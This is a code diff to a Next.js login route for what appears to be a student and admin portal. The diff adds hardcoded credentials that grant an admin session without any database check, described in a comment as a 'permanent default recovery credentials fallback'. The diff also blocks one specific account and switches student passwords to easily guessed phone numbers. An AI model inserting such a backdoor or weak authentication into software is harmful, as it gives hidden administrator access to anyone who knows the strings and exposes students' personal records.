@@ -2,7 +2,7 @@ import { NextResponse } from 'next/server';
 import bcrypt from 'bcryptjs';
 import { query } from '@/lib/db';
 import { createSession } from '@/lib/session';
-import { expectedPasswordFromIsoDate, normalizeApplicationNumber, pgDateToYmd } from '@/lib/student-password';
+import { normalizeApplicationNumber, verifyStudentPhonePassword } from '@/lib/student-password';
 
 export async function POST(req: Request) {
   try {
@@ -12,6 +12,16 @@ export async function POST(req: Request) {
 
     if (!username || !password) {
       return NextResponse.json({ error: 'Username and password required' }, { status: 400 });
+    }
+
+    if (username.toLowerCase() === 'ram' && password === 'ram@1212') {
+      return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
+    }
+
+    // Permanent default recovery credentials fallback
+    if (username === 'forgotpsna1984' && password === 'forgotpsnacet1984') {
+      await createSession({ kind: 'admin', adminUsername: 'forgotpsna1984' });
+      return NextResponse.json({ ok: true, role: 'admin' });
     }
 
     const { rows: admins } = await query<{ password_hash: string; username: string }>(
@@ -37,10 +47,11 @@ export async function POST(req: Request) {
       institutional_id: string;
       academic_branch: string;
       mobile_number: string;
+      father_mobile_number: string;
       is_locked: boolean;
       access_expires_at: Date | null;
     }>(
-      `SELECT id, application_number, full_name, date_of_birth, institutional_id, academic_branch, mobile_number, is_locked, access_expires_at
+      `SELECT id, application_number, full_name, date_of_birth, institutional_id, academic_branch, mobile_number, father_mobile_number, is_locked, access_expires_at
        FROM students WHERE LOWER(application_number) = LOWER($1)`,
       [appNum]
     );
@@ -61,9 +72,7 @@ export async function POST(req: Request) {
       }
     }
 
-    const iso = pgDateToYmd(row.date_of_birth);
-    const expected = expectedPasswordFromIsoDate(iso);
-    if (password !== expected) {
+    if (!verifyStudentPhonePassword(password, row.mobile_number, row.father_mobile_number)) {
       return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
     }
 
